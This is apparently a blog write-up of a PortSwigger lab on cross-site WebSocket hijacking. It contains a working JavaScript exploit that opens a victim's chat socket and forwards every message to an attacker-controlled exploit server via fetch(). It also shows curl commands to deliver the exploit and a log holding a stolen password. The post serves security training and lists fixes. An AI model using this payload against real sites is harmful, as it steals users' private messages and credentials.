---
layout: post
title: "PortSwigger: Cross-site WebSocket hijacking"
date: 2027-11-18 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, WebSockets]
tags: [portswigger, websockets, cswsh, csrf, origin-validation, samesite, cwe-352, cwe-346]
---

A chat feature is just a WebSocket carrying a conversation. This lab's chat replays your full message history the moment you connect — and it does it for whoever holds the session cookie, no questions asked. Because the WebSocket handshake has no CSRF token and the cookie is `SameSite=None`, another website can open *your* chat socket in *your* logged-in context and read everything the server sends back. This is Cross-Site WebSocket Hijacking ([CWE-352](https://cwe.mitre.org/data/definitions/352.html) / [CWE-346](https://cwe.mitre.org/data/definitions/346.html)) — CSRF, but two-way: the attacker reads the responses, not just fires a blind action.

## Overview

The live chat connects to `wss://LAB/chat`. On connect the client sends the literal string `READY`, and the server answers with the entire chat history for that session as JSON. Two design mistakes make that history stealable from any origin:

1. The handshake **has no CSRF token** — nothing proves the connection was intended by the user.
2. The session cookie is `SameSite=None`, so the browser attaches it to the handshake **even cross-site**.

WebSockets are exempt from the Same-Origin Policy and CORS, so an attacker page is free to open the socket — and, unlike classic CSRF, to read the replies.

## Confirming the flaw

Before writing any exploit, replay the handshake by hand with a **forged Origin** and see whether the server cares:

```
GET /chat HTTP/1.1
Host: LAB
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <random-base64>
Sec-WebSocket-Version: 13
Origin: https://evil.example
```

The server replies:

```
HTTP/1.1 101 Switching Protocol
Set-Cookie: session=...; Secure; HttpOnly; SameSite=None
Upgrade: websocket
```

`101 Switching Protocols` with a foreign `Origin`, and a `SameSite=None` cookie — the handshake never validates who is asking. That is the whole bug.

## The exploit

Host this on the exploit server:

```html
<script>
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = function() { ws.send('READY'); };
ws.onmessage = function(event) {
  fetch('https://EXPLOIT-SERVER/exfil?d=' + encodeURIComponent(event.data));
};
</script>
```

When the victim's browser loads the page, the socket opens **with the victim's cookie**, `READY` pulls their chat history, and every returned message is forwarded to the exploit server. No Burp Collaborator required — read the stolen data straight out of the exploit server's **Access log**, where the victim's requests appear with the user-agent `Mozilla/5.0 (Victim)`:

```
GET /exfil?d=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%202aembez88e1m0g5vyxvi%22%7D
```

URL-decoded, that message reads:

```
{"user":"Hal Pline","content":"No problem carlos, it's 2aembez88e1m0g5vyxvi"}
```

Logging in as `carlos` with `2aembez88e1m0g5vyxvi` flips the lab to **Solved**.

## The delivery gotcha

Getting the bot to actually run the exploit is where a run silently stalls. POSTing the exploit-server form with `formAction=DELIVER_TO_VICTIM` returns HTTP 302 but queues **no** victim bot — the access log only ever shows your own IP. The delivery that works is **STORE first, then GET**:

```bash
# 1. store the exploit page
curl -sk "https://EXPLOIT-SERVER/" \
  --data-urlencode 'urlIsHttps=true' \
  --data-urlencode 'responseFile=/exploit' \
  --data-urlencode 'responseHead=HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8' \
  --data-urlencode "responseBody=$(cat exploit.html)" \
  --data-urlencode 'formAction=STORE'

# 2. deliver with a plain GET (a POST DELIVER queues nothing)
curl -sk -L "https://EXPLOIT-SERVER/deliver-to-victim"
```

One more detail: use `encodeURIComponent`, not `btoa` — the chat JSON contains `&apos;` entities that break `btoa`.

## Why it worked

The socket is authenticated purely by the ambient session cookie. Because that cookie is `SameSite=None` and the handshake demands no additional proof of intent, the server cannot tell a legitimate same-site connection apart from one opened by a malicious cross-site page. `READY` then hands the attacker exactly the data the user could see — including a password dropped in conversation.

## The fix

- **Validate the `Origin` header** on every WebSocket handshake against an allowlist; reject cross-site origins.
- **Require a per-connection CSRF/auth token** in the handshake or first message — never authenticate the socket from the cookie alone.
- Set session cookies **`SameSite=Strict` or `Lax`** so a cross-site handshake carries no session.
- Treat WebSocket endpoints with the same access control as any state-changing HTTP route.
